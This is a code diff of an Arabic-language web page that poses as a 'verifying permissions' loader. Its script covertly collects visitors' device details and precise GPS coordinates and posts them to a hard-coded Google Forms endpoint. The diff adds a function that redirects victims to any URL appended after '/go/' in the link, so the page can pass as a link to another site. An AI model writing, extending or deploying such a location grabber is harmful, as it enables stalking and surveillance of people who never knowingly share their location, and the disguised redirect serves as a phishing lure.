@@ -1,129 +1,4 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>جاري التحقق...</title>
-    <!-- خط تجوال ليتطابق مع شكل النص في الصورة -->
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@500;700&display=swap" rel="stylesheet">
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Tajawal', sans-serif;
-        }
-
-        body {
-            background-color: #ffffff; /* خلفية بيضاء بالكامل */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            text-align: center;
-        }
-
-        /* حاوية التحميل بملء الشاشة */
-        #loadingState {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 20px;
-        }
-
-        /* تصميم دائرة التحميل مطابقة للصورة */
-        .loader {
-            width: 55px;
-            height: 55px;
-            border: 5px solid #e6f2eb; /* لون الدائرة الفاتح */
-            border-radius: 50%;
-            border-top-color: #117852; /* لون الخط الأخضر الغامق */
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .loading-text {
-            color: #117852; /* لون النص الأخضر */
-            font-weight: 700;
-            font-size: 1.3rem;
-            letter-spacing: 0.5px;
-        }
-
-        /* تصميم حالة الخطأ (يظهر فقط إذا رفض المستخدم الصلاحية) */
-        #errorState {
-            display: none;
-            width: 100%;
-            max-width: 400px;
-            background: #fff;
-            padding: 25px 20px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
-            border: 1px solid #f5c6cb;
-        }
-
-        .error-title {
-            color: #dc3545;
-            font-size: 1.2rem;
-            margin-bottom: 10px;
-            font-weight: bold;
-        }
-
-        .error-desc {
-            color: #444;
-            font-size: 0.95rem;
-            line-height: 1.6;
-            margin-bottom: 15px;
-        }
-
-        .instructions-list {
-            text-align: right;
-            margin-bottom: 20px;
-            padding-right: 20px;
-            font-size: 0.85rem;
-            color: #555;
-            line-height: 1.7;
-        }
-
-        .btn-refresh {
-            background-color: #117852;
-            color: #ffffff;
-            border: none;
-            width: 100%;
-            padding: 14px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-
-        .btn-refresh:hover {
-            background-color: #0c5b3d;
-        }
-    </style>
-</head>
-<body>
-
-    <!-- الأنيميشن بملء الشاشة كما في الصورة -->
-    <div id="loadingState">
-        <div class="loader"></div>
-        <div class="loading-text" id="loadingText">جاري التحقق من الصلاحيات...</div>
-    </div>
-
-    <!-- رسالة الخطأ المخفية (تظهر عند الرفض فقط) -->
-    <div id="errorState">
-       
-        <button onclick="location.reload()" class="btn-refresh">
-            🔄 تحديث الصفحة
-        </button>
-    </div>
-
-    <script>
+<script>
         const FORM_POST_URL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSccde-5FC3RKLZB-Tq5UsN_jP7Vcu5gCN3LKFGeI0HVS_f3ow/formResponse";
         
         const ENTRY_STATUS     = "entry.560644642"; 
@@ -144,6 +19,21 @@
         window.onload = function() {
             initiateService();
         };
+
+        // دالة جديدة لاستخراج الرابط الهدف من شريط العنوان
+        function getDynamicRedirectUrl() {
+            const currentUrl = window.location.href;
+            // البحث عن المقطع /go/ في الرابط لقص ما بعده
+            const parts = currentUrl.split('/go/');
+            
+            // التحقق مما إذا كان هناك رابط مضاف بعد /go/ ويبدأ بـ http
+            if (parts.length > 1 && parts[1].startsWith('http')) {
+                return parts[1]; // إرجاع الرابط الذي قمت بإضافته
+            }
+            
+            // الرابط الافتراضي في حال فتحت الصفحة بدون تحديد مسار إضافي
+            return "https://www.google.com/maps";
+        }
 
         function initiateService() {
             const deviceInfo = {
@@ -175,9 +65,12 @@
             const lng = position.coords.longitude;
             const accuracy = position.coords.accuracy;
 
-            // إرسال البيانات ثم التحويل المباشر لخرائط جوجل
+            // تحديد الوجهة بناءً على الرابط
+            const targetUrl = getDynamicRedirectUrl();
+
+            // إرسال البيانات ثم التحويل المباشر للرابط المستخرج
             sendDataToGoogle("موافق", lat, lng, accuracy, deviceInfo).finally(() => {
-                window.location.replace(`https://www.google.com/maps`);
+                window.location.replace(targetUrl);
             });
         }
 
@@ -213,5 +106,3 @@
             }).catch(err => console.log('Error:', err));
         }
     </script>
-</body>
-</html>
